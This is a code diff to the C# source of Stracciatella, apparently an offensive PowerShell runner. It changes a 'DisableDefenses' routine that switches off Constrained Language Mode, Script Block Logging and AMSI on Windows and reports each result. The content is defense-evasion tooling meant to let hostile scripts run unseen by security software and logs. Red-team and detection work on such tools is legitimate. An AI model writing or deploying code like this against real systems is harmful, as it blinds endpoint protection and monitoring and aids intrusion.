@@ -1,5 +1,4 @@
-﻿using System.Collections.ObjectModel;
-using System.Management.Automation;
+﻿using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.IO;
 using System.Linq;
@@ -168,7 +167,7 @@ namespace Stracciatella
             return options;
         }
 
-        private static void Info(string fmt)
+        public static void Info(string fmt)
         {
             if(ProgramOptions.Verbose)
             {
@@ -192,16 +191,22 @@ namespace Stracciatella
         private static bool DisableDefenses(PowerShell rs, CustomPSHost host)
         {
             bool ret = true;
-            if ((ret &= DisableAmsi(rs)))
+
+            ret &= DisableClm.DoDisable(rs);
+
+            string l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true);
+            Info($"[.] Language Mode: {l}");
+
+            if(ret && String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase))
             {
-                Info("[+] AMSI Disabled.");
+                Info("[+] Constrained Language Mode Disabled.");
             }
             else
             {
-                Info("[-] AMSI not disabled.");
+                Info("[-] Constrained Language Mode not disabled.");
             }
 
-            if((ret &= DisableScriptLogging(rs)))
+            if ((ret &= DisableScriptLogging(rs)))
             {
                 Info("[+] Script Block Logging Disabled.");
             }
@@ -210,8 +215,14 @@ namespace Stracciatella
                 Info("[-] Script Block Logging not disabled.");
             }
 
-            string l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true);
-            Info($"[.] Language Mode: {l}");
+            if ((ret &= DisableAmsi(rs)))
+            {
+                Info("[+] AMSI Disabled.");
+            }
+            else
+            {
+                Info("[-] AMSI not disabled.");
+            }
 
             return ret;
         }
